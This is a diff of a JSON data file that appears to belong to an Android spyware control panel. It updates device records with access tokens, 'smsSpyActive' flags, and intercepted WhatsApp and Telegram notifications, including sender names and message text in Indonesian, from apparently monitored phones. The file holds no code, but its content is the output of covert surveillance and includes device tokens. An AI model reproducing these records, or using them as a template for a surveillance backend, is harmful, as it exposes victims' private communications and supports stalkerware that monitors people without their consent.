@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777554714,
+    "lastSeen": 1776777557682,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (960 pesan): ~ ----",
+        "content": "N Bt tt",
+        "time": "21/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777559878
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775326505
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3703 pesan dari 23 chat",
-        "time": "21/04 19:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775325467
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777553877,
+    "lastSeen": 1776777559431,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777559410
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:46",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776775594807
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
-        "content": "❌ Gagal membuat panel\nGagal buat user: The email has already been taken.",
-        "time": "21/04 19:46",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776775594786
       }
     ],
     "galleryPhotos": [],
